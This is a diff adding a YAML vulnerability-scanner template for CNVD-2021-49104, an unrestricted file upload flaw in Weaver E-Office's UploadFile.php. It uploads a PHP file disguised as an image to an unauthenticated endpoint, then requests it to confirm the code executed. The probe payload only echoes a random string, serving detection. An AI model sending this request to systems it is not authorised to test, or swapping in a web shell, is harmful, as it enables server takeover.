@@ -1,0 +1,36 @@
+id: CNVD-2021-49104
+
+info:
+  name: 泛微OA E-Office UploadFile.php 任意文件上传漏洞
+  author: zan8in
+  severity: critical
+  information: |
+    在/general/index/UploadFile.php中上传文件过滤不严格导致允许无限制地上传文件，攻击者可以通过该漏洞直接获取网站权限
+    app="泛微-EOffice"
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20UploadFile.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CNVD-2021-49104.html
+
+set:
+  rand1: randomLowercase(16)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=
+      headers:
+        Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+      body: |
+        --e64bdf16c554bbc109cecef6451c26a4
+        Content-Disposition: form-data; name="Filedata"; filename="cmd.php"
+        Content-Type: image/jpeg
+
+        <?php echo "{{rand1}}";?>
+
+        --e64bdf16c554bbc109cecef6451c26a4--
+    expression: response.status == 200 && response.body.bcontains(b'logo-eoffice.php') && !response.body.bcontains(b'move_uploaded_file')
+  r1:
+    request:
+      method: GET
+      path: /images/logo/logo-eoffice.php
+    expression: response.status == 200 && response.body.bcontains(bytes(string(rand1)))
+expression: r0() && r1()
